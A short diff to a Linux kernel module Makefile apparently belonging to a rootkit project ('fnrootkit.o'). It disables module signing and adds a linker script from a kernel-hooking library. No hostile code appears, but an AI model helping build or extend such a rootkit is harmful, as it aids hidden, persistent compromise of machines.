@@ -1,4 +1,5 @@
 CONFIG_MODULE_SIG=n
+ldflags-y += -T$(src)/3rd_party/khook/engine.lds
 
 ifneq ($(KERNELRELEASE),)
 	obj-m := fnrootkit.o
